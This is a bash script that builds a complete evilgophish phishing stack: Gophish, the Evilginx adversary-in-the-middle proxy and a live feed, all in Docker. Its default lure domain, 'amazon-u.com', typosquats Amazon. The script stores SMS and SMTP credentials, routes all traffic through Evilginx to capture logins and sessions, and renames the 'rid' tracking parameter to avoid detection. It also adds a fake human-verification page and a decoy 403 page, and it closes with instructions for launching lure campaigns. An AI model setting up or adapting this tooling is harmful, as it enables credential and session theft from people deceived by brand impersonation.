!/bin/bash
# setup.sh - Comprehensive setup for evilgophish Docker env.
# Handles: Dir creation, .env, configs, SSL, DNS, RID replace, builds, up.
# Usage: ./setup.sh [DOMAIN] [SUBDOMAINS] [PROXY_ROOT] [FEED_ENABLED] [RID_REPLACEMENT] [TWILIO_SID] [TWILIO_TOKEN] [TWILIO_PHONE] [TURNSTILE_PUBLIC] [TURNSTILE_PRIVATE] [SMTP_USER] [SMTP_PASS]
# Enhanced: Prompts all if missing; validates inputs; backups configs; optional LetsEncrypt (commented).
# Best Practices:
# - Validate env: Check for empty secrets.
# - Backups: Cp existing files before overwrite.
# - DNS: Conditional add; warn for prod (use real DNS).
# - RID: Recursive sed; backup originals.
# - Uploads: Pre-populate with templates (turnstile.html, forbidden.html).
# - Tips: Post-setup checklist; common errors (e.g., port conflicts).
# - Security: Chmod secrets; use docker secrets in compose (extend yaml).
# - Automation: Can be non-interactive for CI/CD.

set -e

# Defaults/Prompts
DOMAIN="${1:-amazon-u.com}"
SUBDOMAINS="${2:-support email reset admin}"
PROXY_ROOT="${3:-true}"
FEED_ENABLED="${4:-true}"
RID_REPLACEMENT="${5:-user_id}"
TWILIO_SID="${6:-$(read -p "Twilio SID: " x; echo $x)}"
TWILIO_TOKEN="${7:-$(read -s -p "Twilio Token: " x; echo $x)}"
TWILIO_PHONE="${8:-$(read -p "Twilio Phone (+E.164): " x; echo $x)}"
TURNSTILE_PUBLIC="${9:-$(read -p "Turnstile Public: " x; echo $x)}"
TURNSTILE_PRIVATE="${10:-$(read -s -p "Turnstile Private: " x; echo $x)}"
SMTP_USER="${11:-$(read -p "SMTP User: " x; echo $x)}"
SMTP_PASS="${12:-$(read -s -p "SMTP Pass: " x; echo $x)}"

# Validate
[ -z "$TWILIO_SID" ] && { echo "Error: TWILIO_SID required"; exit 1; }
# ... similar for others

# Dirs/Files
mkdir -p ./gophish/templates ./evilginx/phishlets ./evilginx/templates ./evilfeed ./nginx/ssl ./uploads ./logs
touch .env nginx.conf gophish/config.json
cp -n .env .env.bak || true  # Backup

# .env
cat > .env << EOF
DOMAIN=$DOMAIN
SUBDOMAINS=$SUBDOMAINS
PROXY_ROOT=$PROXY_ROOT
FEED_ENABLED=$FEED_ENABLED
RID_REPLACEMENT=$RID_REPLACEMENT
TWILIO_ACCOUNT_SID=$TWILIO_SID
TWILIO_AUTH_TOKEN=$TWILIO_TOKEN
TWILIO_PHONE=$TWILIO_PHONE
TURNSTILE_PUBLIC=$TURNSTILE_PUBLIC
TURNSTILE_PRIVATE=$TURNSTILE_PRIVATE
SMTP_USER=$SMTP_USER
SMTP_PASS=$SMTP_PASS
GOPHISH_DB_PATH=/app/data/gophish.db
SMTP_HOST=smtp.gmail.com
SMTP_PORT=587
EOF
chmod 600 .env

# nginx.conf - Enhanced with logging, proxy headers
cat > nginx.conf << 'EOF'
events { worker_connections 1024; }
http {
  log_format main '$remote_addr - $remote_user [$time_local] "$request" $status $body_bytes_sent "$http_referer" "$http_user_agent"';
  access_log /var/log/nginx/access.log main;
  error_log /var/log/nginx/error.log warn;
  upstream evilginx { server evilginx:443; }
  upstream gophish { server gophish:3333; }  # Optional local proxy if needed
  server {
    listen 443 ssl http2;
    server_name _;
    ssl_certificate /etc/nginx/ssl/fullchain.pem;
    ssl_certificate_key /etc/nginx/ssl/privkey.pem;
    location / { proxy_pass https://evilginx/; proxy_set_header Host $host; proxy_ssl_verify off; }
  }
  server { listen 80; server_name _; return 301 https://$host$request_uri; }
}
EOF

# SSL: Self-signed; for prod, use certbot (commented)
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout nginx/ssl/privkey.pem -out nginx/ssl/fullchain.pem -subj "/CN=$DOMAIN"
# For LetsEncrypt: docker run -v $(pwd)/ssl:/etc/letsencrypt certbot/certbot certonly --standalone -d $DOMAIN --non-interactive --agree-tos -m email@example.com

# gophish config
cat > gophish/config.json << EOF
{
  "admin_server": { "listen_url": "0.0.0.0:3333", "use_tls": false },
  "phish_server": { "listen_url": "127.0.0.1:8080", "use_tls": false },
  "db_name": "sqlite3",
  "db_path": "data/gophish.db"
}
EOF

# DNS: Local hosts; for prod, use Cloudflare/AWS Route53
HOSTS_ENTRY="127.0.0.1 $DOMAIN"
for sub in $SUBDOMAINS; do HOSTS_ENTRY="$HOSTS_ENTRY ${sub}.${DOMAIN}"; done
sudo cp /etc/hosts /etc/hosts.bak
echo "$HOSTS_ENTRY" | sudo tee -a /etc/hosts
echo "DNS set locally. For prod, configure real DNS pointing to your IP."

# RID replacement: Assume src/ dir with code
[ ! -d ./src ] && git clone https://github.com/fin3ss3g0d/evilgophish.git src  # Public repo example
cd src
find . -type f \( -name "*.go" -o -name "*.html" -o -name "*.tmpl" \) -exec cp {} {}.bak \;
find . -type f \( -name "*.go" -o -name "*.html" -o -name "*.tmpl" \) -exec sed -i "s/rid/${RID_REPLACEMENT}/g" {} \;
cd ..

# Templates: Pre-populate
cat > evilginx/templates/turnstile.html << 'EOF'
<!DOCTYPE html><html><head><title>Security Check</title><script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script><style>body{font-family:Arial;}</style></head><body><h1>Verify You're Human</h1><form action="{{.FormActionURL}}" method="POST"><div class="cf-turnstile" data-sitekey="{{.TurnstilePublicKey}}"></div>{{if .ErrorMessage}}<p style="color:red;">{{.ErrorMessage}}</p>{{end}}<button type="submit" name="button">Continue</button></form></body></html>
EOF

cat > evilginx/templates/forbidden.html << 'EOF'
<!DOCTYPE html><html><head><title>Access Denied</title></head><body><h1>403 Forbidden</h1><p>You don't have permission to access this resource.</p></body></html>
EOF

# Dockerfiles (enhanced with deps)
cat > Dockerfile.gophish << 'EOF'
FROM golang:1.21-alpine AS builder
RUN apk add --no-cache git
WORKDIR /src
COPY src/gophish .
RUN go mod download && CGO_ENABLED=0 go build -o /app/gophish .
FROM alpine:latest
RUN apk add --no-cache ca-certificates tzdata sqlite
WORKDIR /app
COPY --from=builder /app/gophish .
COPY gophish/config.json .
VOLUME /app/data /app/uploads /app/logs
EXPOSE 3333
CMD ["./gophish", "--admin", "./config.json"]
EOF

cat > Dockerfile.evilginx << 'EOF'
FROM golang:1.21-alpine AS builder
RUN apk add --no-cache git
WORKDIR /src
COPY src/evilginx .
RUN go mod download && CGO_ENABLED=0 go build -o /app/evilginx .
FROM alpine:latest
RUN apk add --no-cache ca-certificates iptables ip6tables
WORKDIR /app
COPY --from=builder /app/evilginx .
VOLUME /app /app/logs
EXPOSE 443
EOF

cat > Dockerfile.evilfeed << 'EOF'
FROM golang:1.21-alpine AS builder
RUN apk add --no-cache git
WORKDIR /src
COPY src/evilfeed .
RUN go mod download && CGO_ENABLED=0 go build -o /app/evilfeed .
FROM alpine:latest
WORKDIR /app
COPY --from=builder /app/evilfeed .
VOLUME /app/data /app/logs
EXPOSE 1337
EOF

# Start
docker compose up -d --build

# Post-setup
echo "Setup done! Tips:"
echo "- Upload: cp myfile.csv uploads/; docker cp uploads/myfile.csv gophish:/app/uploads/"
echo "- Access: GoPhish http://localhost:3333 (default admin/gophish), Feed http://localhost:1337"
echo "- Campaign: Configure in UI, landing=lure path e.g. https://${DOMAIN}/lure?${RID_REPLACEMENT}=xxx"
echo "- Backup: docker volume export gophish_data > backup.tar"
echo "- Common Errors: Port 80/443 conflict? lsof -i:80; DNS? ping $DOMAIN"
echo "- Clean: docker compose down -v; sudo mv /etc/hosts.bak /etc/hosts"